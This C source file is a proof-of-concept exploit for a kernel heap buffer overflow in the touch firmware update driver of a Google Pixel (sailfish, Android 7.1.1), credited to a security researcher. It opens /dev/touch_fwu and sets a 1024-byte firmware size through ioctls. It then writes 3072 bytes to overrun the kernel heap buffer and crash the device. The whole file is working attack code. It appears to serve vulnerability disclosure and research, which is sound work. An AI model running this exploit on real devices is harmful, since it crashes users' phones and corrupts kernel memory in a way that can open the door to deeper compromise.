// Kernel Heap Buffer Overflow #1.
//
// Fingerprint:
// [google/sailfish/sailfish:7.1.1/NMF26U/3562008:user/release-keys]
//
// Sagi Kedmi (https://sagi.io, @sagikedmi).
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <stdint.h>
#include <stdbool.h>
#include <strings.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <string.h>
#include <fcntl.h>

#define TOUCH_FWU_IOCTL_CODE    (0x81)
#define FW_FILE_SIZE    _IOW(TOUCH_FWU_IOCTL_CODE, 2, uint32_t)
#define FW_FILE_REQUEST _IO(TOUCH_FWU_IOCTL_CODE, 3)

#define FW_SIZE 1024
#define OVERRUN_SIZE 3*FW_SIZE
#define TOUCH_DEV "/dev/touch_fwu"

int main(void){
    int fd;
    unsigned long fw_size = FW_SIZE;
    char aaa[OVERRUN_SIZE];

    if ((fd = open(TOUCH_DEV, O_WRONLY)) < 0){
        perror("Failed to open " TOUCH_DEV);
        return EXIT_FAILURE;
    }
 
    // Set firmware size.
    if (ioctl(fd, FW_FILE_SIZE, fw_size) < 0){
        perror("IOCTL failure on " TOUCH_DEV);
        close(fd);    
        return EXIT_FAILURE;
    }
    // Allocate a kernel heap buffer of the previously specified size.
    if (ioctl(fd, FW_FILE_REQUEST, &fw_size) < 0){
        perror("IOCTL failure on " TOUCH_DEV);
        close(fd);    
        return EXIT_FAILURE;
    }
    // Overrun the heap buffer with aaa.
    memset(aaa, 'a', sizeof(aaa));
    if (write(fd, aaa, sizeof(aaa)) != sizeof(aaa)){
        perror("Failed to write payload in its entirety.");
        close(fd);
        return EXIT_FAILURE;
    }
    // Pixel should crash (Wait for it..)
    close(fd);
    return EXIT_SUCCESS;
}
